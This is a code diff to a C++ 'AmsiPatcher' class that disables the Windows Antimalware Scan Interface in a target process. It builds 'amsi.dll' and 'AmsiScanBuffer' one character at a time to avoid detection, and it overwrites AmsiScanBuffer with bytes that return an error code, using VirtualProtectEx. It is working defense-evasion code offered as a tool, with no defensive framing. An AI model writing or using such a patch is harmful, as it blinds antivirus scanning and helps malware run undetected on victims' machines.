@@ -9,15 +9,15 @@ private:
     FARPROC AmsiScanBuffer;
     DWORD pid;
 
-    char ams1[9];       
-    char ams10pen[15];   
+    char ams1[9];        
+    char ams10pen[17];    
 
 public:
     AmsiPatcher(DWORD processId) : pid(processId), hProcess(NULL), hAmsiDll(NULL), AmsiScanBuffer(NULL) {
         ams1[0] = 'a'; ams1[1] = 'm'; ams1[2] = 's'; ams1[3] = 'i'; ams1[4] = '.'; ams1[5] = 'd'; ams1[6] = 'l'; ams1[7] = 'l'; ams1[8] = 0;
-        ams10pen[0] = 'A'; ams10pen[1] = 'm'; ams10pen[2] = 's'; ams10pen[3] = 'i'; ams10pen[4] = 'O'; ams10pen[5] = 'p'; ams10pen[6] = 'e';
-        ams10pen[7] = 'n'; ams10pen[8] = 'S'; ams10pen[9] = 'e'; ams10pen[10] = 's'; ams10pen[11] = 's'; ams10pen[12] = 'i'; ams10pen[13] = 'o';
-        ams10pen[14] = 'n'; ams10pen[15] = 0;
+        ams10pen[0] = 'A'; ams10pen[1] = 'm'; ams10pen[2] = 's'; ams10pen[3] = 'i'; ams10pen[4] = 'S'; ams10pen[5] = 'c'; ams10pen[6] = 'a';
+        ams10pen[7] = 'n'; ams10pen[8] = 'B'; ams10pen[9] = 'u'; ams10pen[10] = 'f'; ams10pen[11] = 'f'; ams10pen[12] = 'e'; ams10pen[13] = 'r';
+        ams10pen[14] = 0;
     }
 
     ~AmsiPatcher() {
@@ -51,7 +51,8 @@ public:
             return;
         }
 
-        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; // patch
+        unsigned char patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 }; 
+
         DWORD oldProtect;
 
         if (!VirtualProtectEx(hProcess, AmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect)) {
